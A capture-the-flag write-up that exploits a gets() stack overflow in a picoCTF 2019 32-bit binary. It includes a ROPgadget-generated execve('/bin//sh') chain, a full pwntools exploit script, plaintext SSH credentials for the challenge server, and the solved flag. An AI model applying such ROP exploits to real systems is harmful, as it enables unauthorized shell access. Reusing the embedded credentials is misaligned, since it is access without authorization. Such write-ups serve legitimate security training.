# Problem
Can you exploit the following program to get a flag? You can find the [program](https://2019shell1.picoctf.com/static/9e6fc5d2d0470dc2d418ae812c3ee55f/vuln) in /problems/rop32_4_0636b42072627d283f46d2427804b10c on the shell server. [Source](https://2019shell1.picoctf.com/static/9e6fc5d2d0470dc2d418ae812c3ee55f/vuln.c).

## Hints:

This is a classic ROP to get a shell

## Solution:

Lets download the files:
```bash
wget https://2019shell1.picoctf.com/static/9e6fc5d2d0470dc2d418ae812c3ee55f/vuln
wget https://2019shell1.picoctf.com/static/9e6fc5d2d0470dc2d418ae812c3ee55f/vuln.c
```

First, we investigate the source
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 16

void vuln() {
  char buf[16];
  printf("Can you ROP your way out of this one?\n");
  return gets(buf);

}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  
}
```

In a first glimpse, we can think that overriding the return address and sending a shellcode will be enough.

A deeper observation tells us that the stack isn't executable [Data Execution Prevention](https://en.wikipedia.org/wiki/Executable_space_protection#Windows), [NX bit](https://en.wikipedia.org/wiki/NX_bit).

```bash
roee@Roee-Ubuntu:~/CTFs-Writeups/picoCTF-2019/Binary/rop32-400$ checksec ./vuln

[*] '/home/roee/CTFs-Writeups/picoCTF-2019/Binary/rop32-400/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

The ```vuln()``` function is exploitable. We just need to override the return address and execute some shellcode.

First we need to check the offset overriding the return address. We can use this gdbinit script
```
run < <(echo AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ)
```

Lets debug:
```bash
gdb -x ./gdbinit ./vuln

Stopped reason: SIGSEGV
0x48484848 in ?? ()
```

We know that ```HHHH``` overrides the return address.

### Method 1 - Using automatic tools
We will use [ROPgadget](https://github.com/JonathanSalwan/ROPgadget).

```bash
python ../../../tools/ROPgadget/ROPgadget.py --binary ./vuln --ropchain --badbytes "0a|0d"

...
Unique gadgets found: 10664

ROP chain generation
===========================================================

- Step 1 -- Write-what-where gadgets

  [+] Gadget found: 0x8056e65 mov dword ptr [edx], eax ; ret
  [+] Gadget found: 0x806ee6b pop edx ; ret
  [+] Gadget found: 0x8056334 pop eax ; pop edx ; pop ebx ; ret
  [+] Gadget found: 0x8056420 xor eax, eax ; ret

- Step 2 -- Init syscall number gadgets

  [+] Gadget found: 0x8056420 xor eax, eax ; ret
  [+] Gadget found: 0x807c2fa inc eax ; ret

- Step 3 -- Init syscall arguments gadgets

  [+] Gadget found: 0x80481c9 pop ebx ; ret
  [+] Gadget found: 0x806ee92 pop ecx ; pop ebx ; ret
  [+] Gadget found: 0x806ee6b pop edx ; ret

- Step 4 -- Syscall gadget

  [+] Gadget found: 0x8049563 int 0x80

- Step 5 -- Build the ROP chain

  #!/usr/bin/env python2
  # execve generated by ROPgadget

  from struct import pack

  # Padding goes here
  p = ''

  p += pack('<I', 0x0806ee6b) # pop edx ; ret
  p += pack('<I', 0x080da060) # @ .data
  p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
  p += '/bin'
  p += pack('<I', 0x080da060) # padding without overwrite edx
  p += pack('<I', 0x41414141) # padding
  p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
  p += pack('<I', 0x0806ee6b) # pop edx ; ret
  p += pack('<I', 0x080da064) # @ .data + 4
  p += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
  p += '//sh'
  p += pack('<I', 0x080da064) # padding without overwrite edx
  p += pack('<I', 0x41414141) # padding
  p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
  p += pack('<I', 0x0806ee6b) # pop edx ; ret
  p += pack('<I', 0x080da068) # @ .data + 8
  p += pack('<I', 0x08056420) # xor eax, eax ; ret
  p += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
  p += pack('<I', 0x080481c9) # pop ebx ; ret
  p += pack('<I', 0x080da060) # @ .data
  p += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
  p += pack('<I', 0x080da068) # @ .data + 8
  p += pack('<I', 0x080da060) # padding without overwrite ebx
  p += pack('<I', 0x0806ee6b) # pop edx ; ret
  p += pack('<I', 0x080da068) # @ .data + 8
  p += pack('<I', 0x08056420) # xor eax, eax ; ret
  p += pack('<I', 0x0807c2fa) # inc eax ; ret
  p += pack('<I', 0x0807c2fa) # inc eax ; ret
  p += pack('<I', 0x0807c2fa) # inc eax ; ret
  p += pack('<I', 0x0807c2fa) # inc eax ; ret
  p += pack('<I', 0x0807c2fa) # inc eax ; ret
  p += pack('<I', 0x0807c2fa) # inc eax ; ret
  p += pack('<I', 0x0807c2fa) # inc eax ; ret
  p += pack('<I', 0x0807c2fa) # inc eax ; ret
  p += pack('<I', 0x0807c2fa) # inc eax ; ret
  p += pack('<I', 0x0807c2fa) # inc eax ; ret
  p += pack('<I', 0x0807c2fa) # inc eax ; ret
  p += pack('<I', 0x08049563) # int 0x80
```

Now lets write a simple python script:
```python
#!/usr/bin/env python

from pwn import *
from struct import pack

# Padding goes here
ropchain = ''

ropchain += pack('<I', 0x0806ee6b) # pop edx ; ret
ropchain += pack('<I', 0x080da060) # @ .data
ropchain += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
ropchain += '/bin'
ropchain += pack('<I', 0x080da060) # padding without overwrite edx
ropchain += pack('<I', 0x41414141) # padding
ropchain += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
ropchain += pack('<I', 0x0806ee6b) # pop edx ; ret
ropchain += pack('<I', 0x080da064) # @ .data + 4
ropchain += pack('<I', 0x08056334) # pop eax ; pop edx ; pop ebx ; ret
ropchain += '//sh'
ropchain += pack('<I', 0x080da064) # padding without overwrite edx
ropchain += pack('<I', 0x41414141) # padding
ropchain += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
ropchain += pack('<I', 0x0806ee6b) # pop edx ; ret
ropchain += pack('<I', 0x080da068) # @ .data + 8
ropchain += pack('<I', 0x08056420) # xor eax, eax ; ret
ropchain += pack('<I', 0x08056e65) # mov dword ptr [edx], eax ; ret
ropchain += pack('<I', 0x080481c9) # pop ebx ; ret
ropchain += pack('<I', 0x080da060) # @ .data
ropchain += pack('<I', 0x0806ee92) # pop ecx ; pop ebx ; ret
ropchain += pack('<I', 0x080da068) # @ .data + 8
ropchain += pack('<I', 0x080da060) # padding without overwrite ebx
ropchain += pack('<I', 0x0806ee6b) # pop edx ; ret
ropchain += pack('<I', 0x080da068) # @ .data + 8
ropchain += pack('<I', 0x08056420) # xor eax, eax ; ret
ropchain += pack('<I', 0x0807c2fa) # inc eax ; ret
ropchain += pack('<I', 0x0807c2fa) # inc eax ; ret
ropchain += pack('<I', 0x0807c2fa) # inc eax ; ret
ropchain += pack('<I', 0x0807c2fa) # inc eax ; ret
ropchain += pack('<I', 0x0807c2fa) # inc eax ; ret
ropchain += pack('<I', 0x0807c2fa) # inc eax ; ret
ropchain += pack('<I', 0x0807c2fa) # inc eax ; ret
ropchain += pack('<I', 0x0807c2fa) # inc eax ; ret
ropchain += pack('<I', 0x0807c2fa) # inc eax ; ret
ropchain += pack('<I', 0x0807c2fa) # inc eax ; ret
ropchain += pack('<I', 0x0807c2fa) # inc eax ; ret
ropchain += pack('<I', 0x08049563) # int 0x80


debug = 0

user = 'RoeeSefi'
pw = 'UTTE9CQN2idX28W'

if debug:
  p = process('./vuln')
else:
  s = ssh(host = '2019shell1.picoctf.com', user=user, password=pw)
  s.set_working_directory('/problems/rop32_4_0636b42072627d283f46d2427804b10c')
  p = s.process('./vuln')

binary = ELF('./vuln')

print p.recvuntil('Can you ROP your way out of this one?\n')
p.sendline('AAAABBBBCCCCDDDDEEEEFFFFGGGG' + ropchain)
p.sendline('cat flag.txt')
p.sendline('exit')

print p.recvall()
```

Flag: picoCTF{rOp_t0_b1n_sH_dee2e288}